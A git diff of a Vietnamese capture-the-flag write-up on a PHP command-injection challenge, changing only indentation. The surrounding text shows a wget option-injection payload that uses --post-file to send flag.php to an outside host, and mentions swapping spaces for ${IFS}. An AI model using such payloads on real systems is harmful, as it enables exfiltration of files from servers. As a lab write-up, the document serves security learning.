@@ -46,11 +46,11 @@ nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
 
 - Hướng 3: Tận dụng **wget** đề cho:
 
-		```sh
-		$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
-		$cmd_output = array();
-		exec($command, $cmd_output);
-		```
+			```sh
+			$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
+			$cmd_output = array();
+			exec($command, $cmd_output);
+			```
 	- Nhìn nhận thật kĩ thì `wget` chính là command mà chúng ta cần tìm. Đối với mô hình chung thì việc chèn `command injection` luôn là lựa chọn hàng đầu, tuy nhiên đối với bài đặc biệt như challenge này, `wget` không chỉ giúp chúng ta kết nối ra ngoài internet, mà còn có thể upload được file nên cái chúng ta làm không phải là chèn thêm `command` mà là chèn thèn `option`. Cụ thể sẽ là **wget -q -O - https://kuhi.to/flag/ 9.9.9.9 --post-file flag.php**
 	- Và đây là payload và kết quả:
 <img src=assets/p2.png>
